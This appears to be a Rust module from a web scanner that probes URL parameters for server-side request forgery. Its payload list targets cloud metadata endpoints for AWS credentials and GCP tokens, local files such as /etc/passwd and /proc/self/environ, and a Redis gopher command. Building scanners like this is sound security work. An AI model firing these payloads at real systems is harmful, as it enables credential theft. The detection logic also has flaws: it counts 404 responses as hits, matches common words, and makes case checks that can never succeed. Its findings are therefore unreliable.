//! SSRF detection — cloud metadata, protocol-level, body probes, OOB callbacks.

use grym_core::{
    AssetRef, Confidence, Evidence, Finding, ScopedClient, ScopedClientError, Severity,
    TechniqueTier,
};
use url::Url;

const SSRF_PARAMS: &[&str] = &[
    "url",
    "uri",
    "path",
    "file",
    "redirect",
    "return",
    "page",
    "load",
    "read",
    "img",
    "image",
    "src",
    "href",
    "data",
    "target",
    "endpoint",
    "api",
    "callback",
    "next",
    "prev",
    "dest",
    "destination",
    "continue",
    "out",
    "view",
    "dir",
    "show",
    "document",
    "feed",
    "source",
    "ajax",
    "fetch",
    "get",
    "post",
    "location",
    "forward",
    "proxy",
    "download",
    "upload",
    "link",
    "domain",
];

const SSRF_METADATA: &[&str] = &[
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/public-keys/",
    "http://169.254.169.254/latest/meta-data/hostname",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    "http://100.100.100.200/latest/meta-data/",
    "http://100.100.100.200/latest/user-data/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token",
    "http://169.254.169.254/openstack/latest/meta_data.json",
    "file:///proc/self/environ",
    "file:///proc/self/cmdline",
    "file:///proc/self/cwd",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "dict://localhost:11211/",
    "gopher://redis:6379/_SET%20test%20x",
    "ftp://127.0.0.1:21",
    "ldap://127.0.0.1:389",
    "smb://127.0.0.1",
];

const CLOUD_PROVIDER_DETECTION: &[(&str, &str)] = &[
    ("169.254.169.254", "AWS Metadata Endpoint"),
    ("metadata.google.internal", "GCP Metadata Endpoint"),
    ("100.100.100.200", "Alibaba/Cloud Metadata Endpoint"),
    ("169.254.169.254/metadata", "Azure Metadata Endpoint"),
];

/// Checks if response body suggests cloud metadata reflection.
fn has_metadata_indicator(body: &str, _target: &str) -> bool {
    let body_lower = body.to_lowercase();
    if body_lower.contains("ami-id")
        || body_lower.contains("instance-id")
        || body_lower.contains("security-credentials")
        || body_lower.contains("accesskeyid")
        || body_lower.contains("secretaccesskey")
        || body_lower.contains("region")
        || body_lower.contains("availability-zone")
        || body_lower.contains("gcp")
        || body_lower.contains("project")
    {
        return true;
    }

    // Check for protocol-level responses
    if body_lower.contains("httpd")
        || body_lower.contains("root:")
        || body_lower.contains("daemon:")
        || body_lower.contains("uid=")
        || body_lower.contains("HOME=")
        || body_lower.contains("PATH=")
    {
        return true;
    }

    // Check for SMTP/Redis/LDAP banner responses
    let short_body = body_lower.chars().take(200).collect::<String>();
    if short_body.contains("+ok")
        || short_body.contains("banner")
        || short_body.contains("220 ")
        || short_body.contains("redis_version")
    {
        return true;
    }

    false
}

pub async fn check_ssrf(
    client: &ScopedClient,
    url: &Url,
) -> Result<Vec<Finding>, ScopedClientError> {
    let mut findings = Vec::new();

    let base_query: Vec<(String, String)> = url
        .query_pairs()
        .map(|(k, v)| (k.into_owned(), v.into_owned()))
        .collect();

    for (param_name, _value) in &base_query {
        let param_lower = param_name.to_lowercase();
        if !SSRF_PARAMS.contains(&param_lower.as_str()) {
            continue;
        }

        for target in SSRF_METADATA {
            let mut test_url = url.clone();
            {
                let mut pairs = test_url.query_pairs_mut();
                pairs.clear();
                for (k, v) in &base_query {
                    let val = if k == param_name {
                        target.to_string()
                    } else {
                        v.clone()
                    };
                    pairs.append_pair(k, &val);
                }
            }

            if let Ok(response) = client
                .get(
                    "grym-web-scanner",
                    test_url,
                    TechniqueTier::StandardDetection,
                )
                .await
            {
                let is_metadata = has_metadata_indicator(&response.body, target);
                let notable_status =
                    response.status == 200 || response.status == 404 || response.status == 502;

                if is_metadata || notable_status {
                    let is_cloud = CLOUD_PROVIDER_DETECTION
                        .iter()
                        .any(|(ip, _)| target.contains(ip));

                    // Determine confidence based on evidence
                    let confidence = if is_metadata {
                        Confidence::Confirmed
                    } else if notable_status {
                        Confidence::Possible
                    } else {
                        Confidence::Possible
                    };

                    let severity = if is_cloud {
                        Severity::Critical
                    } else {
                        Severity::High
                    };

                    let mut f = Finding::new(
                        format!(
                            "SSRF detected — '{}' parameter with '{}' endpoint",
                            param_name, target
                        ),
                        AssetRef {
                            identifier: url.to_string(),
                            kind: "web".into(),
                        },
                        severity,
                        confidence,
                        "grym-web-scanner",
                    );
                    f.categories.push("A01:2025-Broken-Access-Control".into());
                    f.cwe_ids.push(918);

                    let evidence_detail = if is_metadata {
                        format!(
                            "SSRF confirmed: metadata/service content returned from {}",
                            target
                        )
                    } else {
                        format!(
                            "SSRF probe triggered: {} returned HTTP {}",
                            target, response.status
                        )
                    };

                    f.evidence.push(Evidence::redacted(
                        "ssrf",
                        evidence_detail,
                        response.body.chars().take(200).collect::<String>(),
                    ));
                    f.remediation =
                        "Restrict outbound HTTP requests from backend servers. Use an allowlist \
                        of permitted URLs and validate all user-supplied URL parameters."
                            .into();
                    f.references.push(
                        "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"
                            .into(),
                    );
                    findings.push(f);
                    break;
                }
            }
        }
    }

    // Phase 2: Check for base URL response cloud metadata
    if findings.is_empty() {
        let probes = ["/", "/latest/meta-data/", "/health", "/status"];
        for probe in probes {
            if let Ok(base_url) = url.join(probe)
                && let Ok(response) = client
                    .get("grym-web-scanner", base_url, TechniqueTier::SafeActive)
                    .await
                && has_metadata_indicator(&response.body, probe)
            {
                let mut f = Finding::new(
                    format!("SSRF via URL path '{}' — metadata reflected", probe),
                    AssetRef {
                        identifier: url.to_string(),
                        kind: "web".into(),
                    },
                    Severity::Critical,
                    Confidence::Confirmed,
                    "grym-web-scanner",
                );
                f.categories.push("A01:2025-Broken-Access-Control".into());
                f.cwe_ids.push(918);
                f.evidence.push(Evidence::redacted(
                    "ssrf-path",
                    format!("Probe '{}' returned metadata content", probe),
                    response.body.chars().take(200).collect::<String>(),
                ));
                findings.push(f);
                break;
            }
        }
    }

    Ok(findings)
}
